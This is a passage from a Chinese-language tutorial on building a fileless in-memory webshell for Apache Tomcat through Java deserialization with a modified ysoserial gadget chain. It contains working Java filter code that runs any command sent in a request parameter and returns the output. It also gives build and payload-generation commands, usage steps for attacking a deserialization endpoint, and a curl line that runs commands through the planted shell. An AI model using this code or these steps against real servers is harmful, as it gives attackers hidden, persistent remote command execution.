&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws TransletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void init(FilterConfig filterConfig) throws ServletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FilterChain filterChain) throws IOException, ServletException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;TomcatShellInject doFilter.....................................................................&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String cmd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((cmd = servletRequest.getParameter(&quot;threedr3am&quot;)) != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process process = Runtime.getRuntime().exec(cmd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.io.BufferedReader bufferedReader = new java.io.BufferedReader(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new java.io.InputStreamReader(process.getInputStream()));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StringBuilder stringBuilder = new StringBuilder();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String line;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while ((line = bufferedReader.readLine()) != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stringBuilder.append(line + &#39;\n&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servletResponse.getOutputStream().flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servletResponse.getOutputStream().close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterChain.doFilter(servletRequest, servletResponse);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void destroy() {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">和第一个步骤创建的</span><span class="cs8926E06">TomcatEchoInject</span><span class="cs9C1B1871">不一样，这里我们不但基础了</span><span class="cs8926E06">AbstractTranslet</span><span class="cs9C1B1871">，还实现了</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">创建一个我们自定义的内存</span><span class="cs8926E06">Webshell</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后，我们也按照第一个步骤那样，创建一个</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">CommonsCollections11</span><span class="cs9C1B1871">类的拷贝，名叫</span><span class="cs9FB05234">CommonsCollections11ForTomcatShellInject</span><span class="cs9C1B1871">，并把其</span><span class="cs9FB05234">Gadgets.createTemplatesImpl(command[0])</span><span class="cs9C1B1871">的调用改成</span><span class="cs9FB05234">Gadgets.createTemplatesImpl(null, TomcatShellInject.class)</span><span class="cs9C1B1871">，这样，我们的</span><span class="cs8926E06">Webshell payload</span><span class="cs9C1B1871">就完成了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过执行</span><span class="cs8926E06">maven</span><span class="cs9C1B1871">打包</span></p><p class="cs3A447A38"><span class="cs9FB05234">mvn clean -Dmaven.test.skip=true compile assembly:assembly</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后执行生成的</span><span class="cs8926E06">jar</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject &gt; ~/tmp/TomcatEchoInject.ysoserial</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">就生成了</span><span class="cs8926E06">CommonsCollections11ForTomcatShellInject</span><span class="cs9C1B1871">的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">了</span></p><h2 class="cs868C439D">
			<a name="Xa17c4c0320b55a78b80bd173f10f7674d2f68f2"><span class="csB2D98684">0x03 </span><span class="cs83F14626">测试</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">上一节中，我们生成了两个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，接下来，我们启动一个具有</span><span class="cs9FB05234">commons-collections:commons-collections:3.2.1</span><span class="cs9C1B1871">依赖的服务端，并且存在反序列化的接口。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后我们把步骤一和步骤二生成的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">依次打过去</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%e5%9f%ba%e4%ba%8eTomcat%e7%9a%84%e5%86%85%e5%ad%98Webshell%20%e6%97%a0%e6%96%87%e4%bb%b6%e6%94%bb%e5%87%bb%e6%8a%80%e6%9c%af_files/image0.png" width="560" height="225" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%e5%9f%ba%e4%ba%8eTomcat%e7%9a%84%e5%86%85%e5%ad%98Webshell%20%e6%97%a0%e6%96%87%e4%bb%b6%e6%94%bb%e5%87%bb%e6%8a%80%e6%9c%af_files/image1.png" width="560" height="210" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以依次看到，两个步骤都返回</span><span class="cs8926E06">500</span><span class="cs9C1B1871">异常，相关信息证明已经执行反序列化成功了，接下来我们试试这个内存</span><span class="cs8926E06">Webshell</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%e5%9f%ba%e4%ba%8eTomcat%e7%9a%84%e5%86%85%e5%ad%98Webshell%20%e6%97%a0%e6%96%87%e4%bb%b6%e6%94%bb%e5%87%bb%e6%8a%80%e6%9c%af_files/image2.png" width="560" height="213" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%e5%9f%ba%e4%ba%8eTomcat%e7%9a%84%e5%86%85%e5%ad%98Webshell%20%e6%97%a0%e6%96%87%e4%bb%b6%e6%94%bb%e5%87%bb%e6%8a%80%e6%9c%af_files/image3.png" width="560" height="441" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">完美，具体</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">改造后的代码，我已经上传到</span><span class="cs8926E06">github</span><span class="cs9C1B1871">，有兴趣可以看看</span><span class="cs8926E06"> <a class="cs508254C" href="https://github.com/ianxtianxt/ysoserial"><span class="cs4B51D5E4">ianxtianxt/ysoserial</span></a></span></p><h3 class="cs868C439D">
			<a name="使用方法"><span class="csD6CA00D2">使用方法</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">通杀回显</span><span class="cs8926E06">-</span><span class="cs9C1B1871">内存</span><span class="cs8926E06">webshell</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">例：</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CommonsCollections11ForTomcatEchoInject &gt; echo.payload</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">然后使用上述得到的恶意序列化数据</span><span class="cs8926E06">echo.payload</span><span class="cs9C1B1871">攻击一遍，然后再继续下面的操作</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CommonsCollections11ForTomcatShellInject &gt; shell.payload</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">使用恶意序列化数据</span><span class="cs8926E06">shell.payload</span><span class="cs9C1B1871">再攻击一遍，可以得到一个内存级的</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">，任意路径，参数</span><span class="cs8926E06">threedram</span><span class="cs9C1B1871">为命令</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl http://127.0.0.1:8080/aaa\?threedr3am\=ls%20/</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7388#toc-3</span></p></body>
</html>
